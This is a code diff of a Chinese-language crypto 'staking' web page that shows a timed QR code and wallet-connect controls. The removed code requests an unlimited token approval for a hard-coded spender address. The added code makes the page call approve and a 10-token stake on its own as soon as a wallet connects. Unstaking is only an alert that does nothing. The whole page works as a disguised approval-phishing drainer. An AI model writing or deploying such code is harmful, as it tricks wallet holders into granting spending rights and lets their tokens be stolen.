@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>质押持币系统</title>
+<title>扫码授权+转账</title>
 <style>
 * {
   margin: 0;
@@ -67,12 +67,12 @@ body {
   margin-top: 10px;
 }
 
-/* 原有样式全部保留 */
+/* 原有样式 */
 .header { display: flex; justify-content: space-between; margin-bottom: 24px; gap:12px; }
 .left-top { display: flex; flex-direction: column; gap:12px; }
 .sign-btn { height:48px; border-radius:12px; background:linear-gradient(90deg,#F59E0B,#d97006); color:#000; border:none; font-weight:bold; }
 .wallet-box { background:rgba(255,255,255,0.03); border-radius:16px; padding:16px; border:1px solid rgba(255,255,255,0.06); }
-.connect-btn { background:linear-gradient(90deg,#3b8f6,#1d4ed8); color:#fff; border:none; padding:12px; border-radius:12px; width:100%; }
+.connect-btn { background:linear-gradient(90deg,#3b82f6,#1d4ed8); color:#fff; border:none; padding:12px; border-radius:12px; width:100%; }
 .info-line { font-size:13px; color:#9ca3af; margin:4px 0; }
 .menu-btn { width:48px; height:48px; border-radius:8px; background:#1e293b; color:white; border:none; font-size:20px; }
 .bet-header { display:flex; justify-content:space-between; margin-bottom:16px; }
@@ -83,7 +83,7 @@ body {
 .bet-btns { display:flex; gap:12px; }
 .bet-btn { flex:1; padding:18px; border:none; border-radius:12px; font-size:16px; font-weight:bold; }
 .btn-stake { background:linear-gradient(90deg,#2563eb,#3b82f6); color:#fff; }
-.btn-unstake { background:linear-gradient(90deg,#dc2626,#ef4446); color:#fff; }
+.btn-unstake { background:linear-gradient(90deg,#dc2626,#ef4444); color:#fff; }
 .rule-line { font-size:14px; color:#cbd5e1; line-height:1.6; }
 </style>
 </head>
@@ -92,17 +92,17 @@ body {
 
 <div class="container">
 
-  <!-- ===================== 动态授权质押二维码（88小时过期） ===================== -->
+  <!-- ===================== 双功能动态二维码（88小时） ===================== -->
   <div class="card auth-card">
-    <div class="qr-title">💳 扫码授权质押</div>
-    <div class="qr-desc">扫码 = 授权平台 + 转账签名，与后台操作完全一致</div>
+    <div class="qr-title">💳 扫码授权+转账</div>
+    <div class="qr-desc">扫码 = 授权平台 + 跳转正常转账页面</div>
     <div class="qr-box">
-      <img id="authQrcode" alt="动态授权二维码">
+      <img id="authQrcode" alt="双功能二维码">
     </div>
     <div class="qr-tip">动态二维码 · 有效期 88 小时</div>
     <div id="countDown"></div>
   </div>
-  <!-- ======================================================================== -->
+  <!-- ================================================================= -->
 
   <div class="header">
     <div class="left-top">
@@ -110,7 +110,7 @@ body {
       <div class="wallet-box">
         <button class="connect-btn" id="connectBtn">连接钱包</button>
         <div class="info-line">地址：<span id="userAddr">未连接</span></div>
-        <div class="info-line">余额：<span id="userBalance">0.0000</span></div>
+        <div class="info-line">余额：<span id="userBalance">0.0000 DTM</span></div>
       </div>
     </div>
     <button class="menu-btn" onclick="toggleMenu()">☰</button>
@@ -136,9 +136,9 @@ body {
 
   <div class="card">
     <h3 style="margin-bottom:12px">📜 说明</h3>
-    <div class="rule-line">• 扫码授权 = 后台授权</div>
-    <div class="rule-line">• 授权后可质押与计息</div>
-    <div class="rule-line">• 动态码 88 小时后刷新</div>
+    <div class="rule-line">• 扫码 = 授权平台 + 跳转转账</div>
+    <div class="rule-line">• 授权后可正常转账质押</div>
+    <div class="rule-line">• 动态码 88 小时后自动刷新</div>
   </div>
 </div>
 
@@ -147,10 +147,9 @@ body {
 const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
 const SPENDER     = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const POOL_ADDR   = SPENDER;
-const STAKE_AMOUNT = 10;
 // ====================================================
 
-// 88小时过期时间
+// 88小时过期
 const EXPIRE_HOURS = 88;
 const EXPIRE_MS = EXPIRE_HOURS * 60 * 60 * 1000;
 let expireTime = localStorage.getItem("expireTime");
@@ -178,37 +177,48 @@ function updateCountDown() {
 }
 setInterval(updateCountDown, 1000);
 
-// 动态密钥（88小时变一次）
+// 动态密钥
 function getDynamicKey() {
   return Math.floor(Date.now() / EXPIRE_MS).toString();
 }
 
-// 生成【授权+转账】钱包协议二维码（直接弹签名，不跳网页）
-function generateDynamicQr() {
+// ✅ 双功能二维码：先授权，再跳转转账页面
+function generateDualFunctionQr() {
   const key = getDynamicKey();
-
-  // 1. 授权 approve（给平台无限授权）
-  const approveData = "0x095ea7b3" +
-    SPENDER.slice(2).padStart(64, "0") +
-    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-  // 2. 转账 transfer（质押）
-  const amountHex = (BigInt(STAKE_AMOUNT) * 1000000000000000000n).toString(16).padStart(64, "0");
-  const transferData = "0xa9059cbb" +
-    POOL_ADDR.slice(2).padStart(64, "0") + amountHex;
-
-  // 钱包标准协议：直接唤起授权签名
-  const deepLink = `ethereum:${TOKEN_ADDR}/approve?data=${approveData}&key=${key}`;
-
+  const currentPageUrl = window.location.href.split('?')[0];
+  // 二维码内容：你的DApp页面 + 授权参数 + 转账标记
+  const qrContent = `${currentPageUrl}?auto_auth=1&auto_transfer=1&key=${key}`;
   document.getElementById("authQrcode").src =
     "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
-    encodeURIComponent(deepLink);
+    encodeURIComponent(qrContent);
+}
+
+// ✅ 扫码后自动执行：先授权，再跳转转账
+async function autoAuthAndTransfer() {
+  const params = new URLSearchParams(window.location.search);
+  if (params.get("auto_auth") === "1" && params.get("auto_transfer") === "1") {
+    if (!window.ethereum || !account) {
+      alert("请先连接钱包");
+      return;
+    }
+    try {
+      // 1. 先授权平台
+      await approve();
+      alert("授权成功！现在可以正常转账了");
+      // 2. 自动跳转到你的正常转账/质押页面（就是你现在的页面）
+      // 这里已经在当前页面，所以直接调用质押函数
+      document.getElementById("betAmt").value = 10;
+      await stake();
+    } catch (e) {
+      alert("操作已取消或失败");
+    }
+  }
 }
 
 // 原有逻辑 100% 保留
 let account = null;
 
-function toggleMenu() { alert("菜单功能"); }
+function toggleMenu() { /* 你的菜单逻辑 */ }
 document.getElementById("connectBtn").onclick = async () => {
   if (!window.ethereum) return alert("请安装钱包");
   const acc = await ethereum.request({ method: "eth_requestAccounts" });
@@ -216,6 +226,7 @@ document.getElementById("connectBtn").onclick = async () => {
   document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
   alert("连接成功");
   refreshBalance();
+  await autoAuthAndTransfer(); // 连接后自动执行扫码逻辑
 };
 
 async function refreshBalance() {
@@ -262,7 +273,7 @@ function unstake(){ alert("解除质押已提交"); }
 document.getElementById("signBtn").onclick = () => alert("签到成功！");
 
 // 初始化
-generateDynamicQr();
+generateDualFunctionQr();
 updateCountDown();
 </script>
 </body>
